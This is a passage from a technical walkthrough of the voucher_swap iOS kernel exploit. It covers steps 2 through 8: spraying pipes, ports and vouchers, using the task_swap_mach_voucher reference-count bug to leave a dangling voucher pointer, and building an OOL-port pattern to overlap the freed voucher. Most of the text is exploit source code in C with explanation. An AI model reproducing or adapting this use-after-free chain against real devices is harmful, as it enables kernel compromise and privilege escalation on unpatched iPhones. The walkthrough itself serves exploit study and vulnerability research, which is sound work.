<p>Generate pipes for the spray. These pipes will be sprayed after the ports spray so they can land in adjacent memory. The maximum size allowed for a pipe buffer is <strong>16384</strong> bytes and the total size for all the pipe buffers is <strong>16MB</strong>. Therefore the total number of pipes that can be sprayed is <strong>1024</strong>. During the overlap, one of the pipes and its corresponding pipe buffer will overlap with the fake port.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 2\. Create some pipes so that we can spray pipe buffers later. We'll be limited to 16 MB</span>
    	<span class="c1">// of pipe memory, so don't bother creating more.</span>
    	<span class="n">pipe_buffer_size</span> <span class="o">=</span> <span class="mi">16384</span><span class="p">;</span>
    	<span class="kt">size_t</span> <span class="n">pipe_count</span> <span class="o">=</span> <span class="mi">16</span> <span class="o">*</span> <span class="n">MB</span> <span class="o">/</span> <span class="n">pipe_buffer_size</span><span class="p">;</span>
    	<span class="n">increase_file_limit</span><span class="p">();</span>
    	<span class="kt">int</span> <span class="o">*</span><span class="n">pipefds_array</span> <span class="o">=</span> <span class="n">create_pipes</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pipe_count</span><span class="p">);</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"created %zu pipes"</span><span class="p">,</span> <span class="n">pipe_count</span><span class="p">);</span></code></pre></figure>

<h4 id="step-3-spray-the-heap-with-ports">Step 3: Spray the Heap with Ports</h4>

<p>We need to spray a lot of IPC ports. Some of these ports will close the existing holes and force the kernel to allocate additional blocks from the zone map. When we spray the pipe buffers after that, we will assume that they land just in front of the ports. The <strong>filler_port_count</strong> is chosen to be <strong>8000</strong> based on trial and error. The <strong>base_port</strong> is the last port created using the <strong>create_ports</strong> call. Remember this as we will use it again in Step 8. The next memory block should be hopefully allocated next to the pipe buffers, and since the pipe size is <strong>16MB</strong>, our fake port which we will create inside the pipe buffer should be within the <strong>16MB</strong> range. On the first <strong>2000 ports</strong>, we also increase the queue limit, which is the maximum of messages that can be sent at once to the port. The reason for doing is on the first <strong>2000</strong> ports is because we will be sending messages using OOL ports descriptor to these ports in order to reallocate the freed vouchers, and hence having the ability to send more messages to these ports would help in the spray.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 3\. Spray a bunch of IPC ports. Hopefully these ports force the ipc.ports zone to grow</span>
    	<span class="c1">// and allocate fresh pages from the zone map, so that the pipe buffers we allocate next</span>
    	<span class="c1">// are placed directly after the ports.</span>
    	<span class="c1">//</span>
    	<span class="c1">// We want to do this as early as possible so that the ports are given low addresses in the</span>
    	<span class="c1">// zone map, which increases the likelihood that bits 28-31 of the pointer are 0 (which is</span>
    	<span class="c1">// necessary later so that the overlapping iv_refs field of the voucher is valid).</span>
    	<span class="k">const</span> <span class="kt">size_t</span> <span class="n">filler_port_count</span> <span class="o">=</span> <span class="mi">8000</span><span class="p">;</span>
    	<span class="k">const</span> <span class="kt">size_t</span> <span class="n">base_port_to_fake_port_offset</span> <span class="o">=</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">MB</span><span class="p">;</span>
    	<span class="n">mach_port_t</span> <span class="o">*</span><span class="n">filler_ports</span> <span class="o">=</span> <span class="n">create_ports</span><span class="p">(</span><span class="n">filler_port_count</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"created %zu ports"</span><span class="p">,</span> <span class="n">filler_port_count</span><span class="p">);</span>
    	<span class="c1">// Grab the base port.</span>
    	<span class="n">base_port</span> <span class="o">=</span> <span class="n">filler_ports</span><span class="p">[</span><span class="n">filler_port_count</span><span class="p">];</span>
    	<span class="c1">// Bump the queue limit on the first 2000 ports, which will also be used as holding ports.</span>
    	<span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">2000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">port_increase_queue_limit</span><span class="p">(</span><span class="n">filler_ports</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    	<span class="p">}</span></code></pre></figure>

<h4 id="step-4-spray-the-pipe-buffers">Step 4: Spray the Pipe buffers</h4>

<p>Next, we spray the heap with pipe buffers and hope they land just after the ports in memory.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 4\. Spray our pipe buffers. We're hoping that these land contiguously right after the</span>
    	<span class="c1">// ports.</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">pipe_buffer_size</span> <span class="o">==</span> <span class="mi">16384</span><span class="p">);</span>
    	<span class="n">pipe_buffer</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">pipe_buffer_size</span><span class="p">);</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">pipe_buffer</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">);</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">pipe_count</span> <span class="o">&lt;=</span> <span class="n">IO_BITS_KOTYPE</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
    	<span class="kt">size_t</span> <span class="n">pipes_sprayed</span> <span class="o">=</span> <span class="n">pipe_spray</span><span class="p">(</span><span class="n">pipefds_array</span><span class="p">,</span>
    			<span class="n">pipe_count</span><span class="p">,</span> <span class="n">pipe_buffer</span><span class="p">,</span> <span class="n">pipe_buffer_size</span><span class="p">,</span>
    			<span class="o">^</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">pipe_index</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
    		<span class="c1">// For each pipe buffer we're going to spray, initialize the possible ipc_ports</span>
    		<span class="c1">// so that the IKOT_TYPE tells us which pipe index overlaps. We have 1024 pipes and</span>
    		<span class="c1">// 12 bits of IKOT_TYPE data, so the pipe index should fit just fine.</span>
    		<span class="n">iterate_ipc_ports</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="o">^</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">port_offset</span><span class="p">,</span> <span class="n">bool</span> <span class="o">*</span><span class="n">stop</span><span class="p">)</span> <span class="p">{</span>
    			<span class="kt">uint8_t</span> <span class="o">*</span><span class="n">port</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">data</span> <span class="o">+</span> <span class="n">port_offset</span><span class="p">;</span>
    			<span class="n">FIELD</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_bits</span><span class="p">,</span>       <span class="kt">uint32_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">io_makebits</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">IOT_PORT</span><span class="p">,</span> <span class="n">pipe_index</span><span class="p">);</span>
    			<span class="n">FIELD</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_references</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    			<span class="n">FIELD</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_mscount</span><span class="p">,</span>    <span class="kt">uint32_t</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    			<span class="n">FIELD</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_srights</span><span class="p">,</span>    <span class="kt">uint32_t</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    		<span class="p">});</span>
    	<span class="p">});</span>
    	<span class="kt">size_t</span> <span class="n">sprayed_size</span> <span class="o">=</span> <span class="n">pipes_sprayed</span> <span class="o">*</span> <span class="n">pipe_buffer_size</span><span class="p">;</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"sprayed %zu bytes to %zu pipes in kalloc.%zu"</span><span class="p">,</span>
    			<span class="n">sprayed_size</span><span class="p">,</span> <span class="n">pipes_sprayed</span><span class="p">,</span> <span class="n">pipe_buffer_size</span><span class="p">);</span></code></pre></figure>

<p>Also, for each pipe buffer, we are going to write the pipe buffer with possible <strong>ipc_port</strong> structs and change the 12 bits of <strong>IKOT_TYPE</strong> for the port to the pipe index. This will help us in finding the overalapping pipe amongst all the pipes, since the data in the pipe buffer will be interpreted as a fake port. This is done by the callback function <strong>update</strong> which in turn calls <strong>iterate_ipc_ports</strong> and sets the attributes for the <strong>ipc_port</strong>. This data is then written to the write end of the buffer.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="kt">size_t</span>
    <span class="nf">pipe_spray</span><span class="p">(</span><span class="k">const</span> <span class="kt">int</span> <span class="o">*</span><span class="n">pipefds</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">pipe_count</span><span class="p">,</span>
    		<span class="kt">void</span> <span class="o">*</span><span class="n">pipe_buffer</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">pipe_buffer_size</span><span class="p">,</span>
    		<span class="kt">void</span> <span class="p">(</span><span class="o">^</span><span class="n">update</span><span class="p">)(</span><span class="kt">uint32_t</span> <span class="n">pipe_index</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">))</span> <span class="p">{</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">pipe_count</span> <span class="o">&lt;=</span> <span class="mh">0xffffff</span><span class="p">);</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">pipe_buffer_size</span> <span class="o">&gt;</span> <span class="mi">512</span><span class="p">);</span>
    	<span class="kt">size_t</span> <span class="n">write_size</span> <span class="o">=</span> <span class="n">pipe_buffer_size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
    	<span class="kt">size_t</span> <span class="n">pipes_filled</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    	<span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">pipe_count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    		<span class="c1">// Update the buffer.</span>
    		<span class="k">if</span> <span class="p">(</span><span class="n">update</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    			<span class="n">update</span><span class="p">((</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">i</span><span class="p">,</span> <span class="n">pipe_buffer</span><span class="p">,</span> <span class="n">pipe_buffer_size</span><span class="p">);</span>
    		<span class="p">}</span>
    		<span class="c1">// Fill the write-end of the pipe with the buffer. Leave off the last byte.</span>
    		<span class="kt">int</span> <span class="n">wfd</span> <span class="o">=</span> <span class="n">pipefds</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
    		<span class="kt">ssize_t</span> <span class="n">written</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">wfd</span><span class="p">,</span> <span class="n">pipe_buffer</span><span class="p">,</span> <span class="n">write_size</span><span class="p">);</span>
    		<span class="k">if</span> <span class="p">(</span><span class="n">written</span> <span class="o">!=</span> <span class="n">write_size</span><span class="p">)</span> <span class="p">{</span>
    			<span class="c1">// This is most likely because we've run out of pipe buffer memory. None of</span>
    			<span class="c1">// the subsequent writes will work either.</span>
    			<span class="k">break</span><span class="p">;</span>
    		<span class="p">}</span>
    		<span class="n">pipes_filled</span><span class="o">++</span><span class="p">;</span>
    	<span class="p">}</span>
    	<span class="k">return</span> <span class="n">pipes_filled</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<p>As we can see from Step 4, the <strong>iterate_ipc_ports</strong> basically considers the data as <strong>ipc_port</strong> structs and has a callback function specifying the port offset which is used to set the attributes of the ports.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cm">/*
     * iterate_ipc_ports
     *
     * Description:
     * 	A utility function to help iterate over data as an array of ipc_port structs in zalloc
     * 	blocks.
     */</span>
    <span class="k">static</span> <span class="kt">void</span>
    <span class="nf">iterate_ipc_ports</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">void</span> <span class="p">(</span><span class="o">^</span><span class="n">callback</span><span class="p">)(</span><span class="kt">size_t</span> <span class="n">port_offset</span><span class="p">,</span> <span class="n">bool</span> <span class="o">*</span><span class="n">stop</span><span class="p">))</span> <span class="p">{</span>
    	<span class="c1">// Iterate through each block.</span>
    	<span class="kt">size_t</span> <span class="n">block_count</span> <span class="o">=</span> <span class="p">(</span><span class="n">size</span> <span class="o">+</span> <span class="n">BLOCK_SIZE</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">/</span> <span class="n">BLOCK_SIZE</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">);</span>
    	<span class="n">bool</span> <span class="n">stop</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
    	<span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">block</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="o">!</span><span class="n">stop</span> <span class="o">&amp;&amp;</span> <span class="n">block</span> <span class="o">&lt;</span> <span class="n">block_count</span><span class="p">;</span> <span class="n">block</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    		<span class="c1">// Iterate through each port in this block.</span>
    		<span class="kt">size_t</span> <span class="n">port_count</span> <span class="o">=</span> <span class="n">size</span> <span class="o">/</span> <span class="n">SIZE</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">);</span>
    		<span class="k">if</span> <span class="p">(</span><span class="n">port_count</span> <span class="o">&gt;</span> <span class="n">COUNT_PER_BLOCK</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">))</span> <span class="p">{</span>
    			<span class="n">port_count</span> <span class="o">=</span> <span class="n">COUNT_PER_BLOCK</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">);</span>
    		<span class="p">}</span>
    		<span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">port</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="o">!</span><span class="n">stop</span> <span class="o">&amp;&amp;</span> <span class="n">port</span> <span class="o">&lt;</span> <span class="n">port_count</span><span class="p">;</span> <span class="n">port</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    			<span class="n">callback</span><span class="p">(</span><span class="n">BLOCK_SIZE</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">)</span> <span class="o">*</span> <span class="n">block</span> <span class="o">+</span> <span class="n">SIZE</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">)</span> <span class="o">*</span> <span class="n">port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stop</span><span class="p">);</span>
    		<span class="p">}</span>
    		<span class="n">size</span> <span class="o">-=</span> <span class="n">BLOCK_SIZE</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">);</span>
    	<span class="p">}</span>
    <span class="p">}</span></code></pre></figure>

<p>The callback function is used to update the pipe buffer and overwrite it with <strong>ipc_port</strong> structs.</p>

<h4 id="step-5-spray-the-heap-with-vouchers">Step 5: Spray the Heap with Vouchers</h4>

<p>Next, we spray the heap with Vouchers. And also choose one voucher port that will be eventually freed and call it <strong>uaf_voucher_port</strong>. As discussed in the previous article, memory is taken from the zone map in blocks. The size of a block is fixed for a particular object for a particular version (<strong>0x4000</strong> for <strong>ipc_voucher</strong> for <strong>iPhone11,8 16C50</strong>). Since the voucher size is also fixed (<strong>0x50</strong>), the number of voucher objects in a block is also fixed (<strong>0x4000/0x50 = 80</strong>) The idea is to allocate extra blocks where the voucher that we will free eventually (<strong>uaf_voucher_port</strong>) will be stored. The first <strong>300</strong> vouchers are basically to fill up the initial holes. And then we spray vouchers to take up about <strong>16</strong> blocks, where we plan to put our freed voucher in the target block (Block 7-10). These blocks will then be used for overlapping with OOL port pointers as we will see later.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 5\. Spray IPC vouchers. After we trigger the vulnerability to get a dangling voucher</span>
    	<span class="c1">// pointer, we can trigger zone garbage collection and get them reallocated with our OOL</span>
    	<span class="c1">// ports spray.</span>
    	<span class="c1">//</span>
    	<span class="c1">// Assume we'll need 300 early vouchers, 6 transition blocks, 4 target block, and 6 late</span>
    	<span class="c1">// blocks.</span>
    	<span class="k">const</span> <span class="kt">size_t</span> <span class="n">voucher_spray_count</span> <span class="o">=</span> <span class="mi">300</span> <span class="o">+</span> <span class="p">(</span><span class="mi">6</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span> <span class="o">*</span> <span class="nf">COUNT_PER_BLOCK</span><span class="p">(</span><span class="n">ipc_voucher</span><span class="p">);</span>
    	<span class="k">const</span> <span class="kt">size_t</span> <span class="n">uaf_voucher_index</span> <span class="o">=</span> <span class="n">voucher_spray_count</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">*</span> <span class="nf">COUNT_PER_BLOCK</span><span class="p">(</span><span class="n">ipc_voucher</span><span class="p">);</span>
    	<span class="n">mach_port_t</span> <span class="o">*</span><span class="n">voucher_ports</span> <span class="o">=</span> <span class="n">voucher_spray</span><span class="p">(</span><span class="n">voucher_spray_count</span><span class="p">);</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"created %zu vouchers"</span><span class="p">,</span> <span class="n">voucher_spray_count</span><span class="p">);</span>
    	<span class="n">mach_port_t</span> <span class="n">uaf_voucher_port</span> <span class="o">=</span> <span class="n">voucher_ports</span><span class="p">[</span><span class="n">uaf_voucher_index</span><span class="p">];</span></code></pre></figure>

<h4 id="step-6-more-spraying">Step 6: More Spraying</h4>

<p>Next, we spray some more memory using the ports we created earlier. This can be later freed to prompt garbage collection. If you remember we had created filler ports and bumped the queue limit on the first <strong>2000</strong> ports. In this case, the first <strong>500</strong> ports are being used for spraying again.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 6\. Spray 15% of memory (400MB on the iPhone XR) in kalloc.1024 that we can free later to</span>
    	<span class="c1">// prompt gc. We'll reuse some of the early ports from the port spray above for this.</span>
    	<span class="k">const</span> <span class="kt">size_t</span> <span class="n">gc_spray_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">.</span><span class="mi">15</span> <span class="o">*</span> <span class="n">platform</span><span class="p">.</span><span class="n">memory_size</span><span class="p">;</span>
    	<span class="n">mach_port_t</span> <span class="o">*</span><span class="n">gc_ports</span> <span class="o">=</span> <span class="n">filler_ports</span><span class="p">;</span>
    	<span class="kt">size_t</span> <span class="n">gc_port_count</span> <span class="o">=</span> <span class="mi">500</span><span class="p">;</span>		<span class="c1">// Use at most 500 ports for the spray.</span>
    	<span class="n">sprayed_size</span> <span class="o">=</span> <span class="n">kalloc_spray_size</span><span class="p">(</span><span class="n">gc_ports</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">gc_port_count</span><span class="p">,</span> <span class="mi">768</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="n">gc_spray_size</span><span class="p">);</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"sprayed %zu bytes to %zu ports in kalloc.%u"</span><span class="p">,</span> <span class="n">sprayed_size</span><span class="p">,</span> <span class="n">gc_port_count</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span></code></pre></figure>

<h4 id="step-7-store-a-pointer-to-the-voucher-but-release-the-reference">Step 7: Store a pointer to the voucher but release the reference</h4>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 7\. Stash a pointer to an ipc_voucher in the thread's ith_voucher field and then remove</span>
    	<span class="c1">// the added reference. That way, when we deallocate the voucher ports later, we'll be left</span>
    	<span class="c1">// with a dangling voucher pointer in ith_voucher.</span>
    	<span class="n">kr</span> <span class="o">=</span> <span class="n">thread_set_mach_voucher</span><span class="p">(</span><span class="kr">thread</span><span class="p">,</span> <span class="n">uaf_voucher_port</span><span class="p">);</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">kr</span> <span class="o">==</span> <span class="n">KERN_SUCCESS</span><span class="p">);</span>
    	<span class="n">voucher_release</span><span class="p">(</span><span class="n">uaf_voucher_port</span><span class="p">);</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"stashed voucher pointer in thread"</span><span class="p">);</span>	</code></pre></figure>

<p>The reference is then released by the <strong>voucher_release</strong> function. Actually, @_bazad created two similar functions for releasing a reference (<strong>voucher_release</strong>) and leaking a reference (<strong>voucher_reference</strong>) which are both wrappers over <strong>voucher_tweak_references</strong> which is a wrapper over <strong>task_swap_mach_voucher</strong>. As you remember, the vulnerability was in calling the function <strong>task_swap_mach_voucher()</strong> which takes as input the current task, a new voucher (reference will be released) and and old voucher (reference will be leaked). Hence if you want to release a reference for a voucher, just pass it as an argument instead of the new voucher and the old voucher can be set as <strong>MACH_PORT_NULL</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="cm">/*
     * voucher_reference
     *
     * Description:
     * 	Add a reference to the voucher represented by the voucher port.
     */</span>
    <span class="k">static</span> <span class="kt">void</span>
    <span class="nf">voucher_reference</span><span class="p">(</span><span class="n">mach_port_t</span> <span class="n">voucher</span><span class="p">)</span> <span class="p">{</span>
    	<span class="n">voucher_tweak_references</span><span class="p">(</span><span class="n">MACH_PORT_NULL</span><span class="p">,</span> <span class="n">voucher</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="cm">/*
     * voucher_release
     *
     * Description:
     * 	Release a reference on the voucher represented by the voucher port.
     */</span>
    <span class="k">static</span> <span class="kt">void</span>
    <span class="nf">voucher_release</span><span class="p">(</span><span class="n">mach_port_t</span> <span class="n">voucher</span><span class="p">)</span> <span class="p">{</span>
    	<span class="n">voucher_tweak_references</span><span class="p">(</span><span class="n">voucher</span><span class="p">,</span> <span class="n">MACH_PORT_NULL</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="cm">/*
     * voucher_tweak_references
     *
     * Description:
     * 	Use the task_swap_mach_voucher() vulnerabilities to modify the reference counts of 2
     * 	vouchers.
     */</span>
    <span class="k">static</span> <span class="kt">void</span>
    <span class="nf">voucher_tweak_references</span><span class="p">(</span><span class="n">mach_port_t</span> <span class="n">release_voucher</span><span class="p">,</span> <span class="n">mach_port_t</span> <span class="n">reference_voucher</span><span class="p">)</span> <span class="p">{</span>
    	<span class="c1">// Call task_swap_mach_voucher() to tweak the reference counts (two bugs in one!).</span>
    	<span class="n">mach_port_t</span> <span class="n">inout_voucher</span> <span class="o">=</span> <span class="n">reference_voucher</span><span class="p">;</span>
    	<span class="n">kern_return_t</span> <span class="n">kr</span> <span class="o">=</span> <span class="n">task_swap_mach_voucher</span><span class="p">(</span><span class="n">mach_task_self</span><span class="p">(),</span> <span class="n">release_voucher</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">inout_voucher</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"%s returned %d: %s"</span><span class="p">,</span> <span class="s">"task_swap_mach_voucher"</span><span class="p">,</span> <span class="n">kr</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">kr</span><span class="p">));</span>
    	<span class="p">}</span>
    	<span class="c1">// At this point we've successfully tweaked the voucher reference counts, but our port</span>
    	<span class="c1">// reference counts might be messed up because of the voucher port returned in</span>
    	<span class="c1">// inout_voucher! We need to deallocate it (it's extra anyways, since</span>
    	<span class="c1">// task_swap_mach_voucher() doesn't swallow the existing send rights).</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">==</span> <span class="n">KERN_SUCCESS</span> <span class="o">&amp;&amp;</span> <span class="n">MACH_PORT_VALID</span><span class="p">(</span><span class="n">inout_voucher</span><span class="p">))</span> <span class="p">{</span>
    		<span class="n">kr</span> <span class="o">=</span> <span class="n">mach_port_deallocate</span><span class="p">(</span><span class="n">mach_task_self</span><span class="p">(),</span> <span class="n">inout_voucher</span><span class="p">);</span>
    		<span class="n">assert</span><span class="p">(</span><span class="n">kr</span> <span class="o">==</span> <span class="n">KERN_SUCCESS</span><span class="p">);</span>
    	<span class="p">}</span>
    <span class="p">}</span></code></pre></figure>

<h4 id="step-8-create-the-ool-ports-pattern-that-will-overlap-the-freed-voucher">Step 8: Create the OOL ports pattern that will overlap the freed voucher</h4>

<p>Now we need to create a pattern of OOL port pointers which will eventually overlap our vouchers. The author chooses the <strong>kalloc.32768</strong> zone to overlap the voucher , simply because its <strong>2<em>(BLOCK_SIZE(ipc_voucher))** or **2</em>(0x4000)</strong> and hence it will be easier to predict the offsets for the voucher. The number of port pointers are calculated based on the zone size divided by size of <strong>uint64_t</strong> which is the size of a port pointer. Then <strong>calloc</strong> call is used to initialize an array with the number of port pointers, each of size <strong>mach_port_t</strong> and then set to 0. The <strong>iterate_ipc_vouchers_via_mach_ports</strong> function is used to walk through the port pointers assuming them as vouchers and using a call back function giving out the offset of the voucher, and then setting <strong>iv_refs</strong> of the voucher to point to the base port, which you must remember from Step 2. The <strong>ool_ports[voucher_start + 1]</strong> is used because the <strong>iv_refs</strong> is at an offset <strong>0x8</strong> from the start of the voucher, and hence <strong>ool_ports[voucher_start + 1]</strong> will actually point to index <strong>0x8</strong> of the voucher. We will make the <strong>iv_refs</strong> field point to the base port, which is just before the pipe buffers. We also leave the <strong>iv_port</strong> pointer as <strong>MACH_PORT_NULL</strong> (set by calloc), so that when we can call <strong>thread_get_mach_voucher</strong> later on we get a new voucher port.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="o">/</span> <span class="mi">8</span><span class="err">\</span><span class="p">.</span> <span class="n">Create</span> <span class="n">the</span> <span class="n">OOL</span> <span class="n">ports</span> <span class="n">pattern</span> <span class="n">that</span> <span class="n">we</span> <span class="n">will</span> <span class="n">spray</span> <span class="n">to</span> <span class="n">overwrite</span> <span class="n">the</span> <span class="n">freed</span> <span class="n">voucher</span><span class="p">.</span>
    	<span class="c1">//</span>
    	<span class="c1">// We will reallocate the voucher to kalloc.32768, which is a convenient size since it lets</span>
    	<span class="c1">// us very easily predict what offsets in the allocation correspond to which fields of the</span>
    	<span class="c1">// voucher.</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">BLOCK_SIZE</span><span class="p">(</span><span class="n">ipc_voucher</span><span class="p">)</span> <span class="o">==</span> <span class="mi">16384</span><span class="p">);</span>
    	<span class="k">const</span> <span class="kt">size_t</span> <span class="n">ool_port_spray_kalloc_zone</span> <span class="o">=</span> <span class="mi">32768</span><span class="p">;</span>
    	<span class="k">const</span> <span class="kt">size_t</span> <span class="n">ool_port_count</span> <span class="o">=</span> <span class="n">ool_port_spray_kalloc_zone</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">);</span>
    	<span class="n">mach_port_t</span> <span class="o">*</span><span class="n">ool_ports</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">ool_port_count</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mach_port_t</span><span class="p">));</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">ool_ports</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">);</span>
    	<span class="c1">// Now, walk though and initialize the "vouchers" in the ool_ports array.</span>
    	<span class="n">iterate_ipc_vouchers_via_mach_ports</span><span class="p">(</span><span class="n">ool_port_count</span><span class="p">,</span> <span class="o">^</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">voucher_start</span><span class="p">)</span> <span class="p">{</span>
    		<span class="c1">// Send an OOL port one pointer past the start of the voucher. This will cause the</span>
    		<span class="c1">// port pointer to overlap the voucher's iv_refs field, allowing us to use the</span>
    		<span class="c1">// voucher port we'll get from thread_get_mach_voucher() later without panicking.</span>
    		<span class="c1">// This port plays double-duty since we'll later use the reference count bug again</span>
    		<span class="c1">// to increment the refcount/port pointer to point into our pipe buffer spray,</span>
    		<span class="c1">// giving us a fake port.</span>
    		<span class="n">ool_ports</span><span class="p">[</span><span class="n">voucher_start</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">base_port</span><span class="p">;</span>
    		<span class="c1">// Leave the voucher's iv_port field (index 7) as MACH_PORT_NULL, so that we can</span>
    		<span class="c1">// call thread_get_mach_voucher() to get a new voucher port that references this</span>
    		<span class="c1">// voucher. This is what allows us to manipulate the reference count later to</span>
    		<span class="c1">// change the OOL port set above.</span>
    	<span class="p">});</span></code></pre></figure>

<h4 id="step-9-free-the-first-gc-spray">Step 9: Free the first GC Spray</h4>

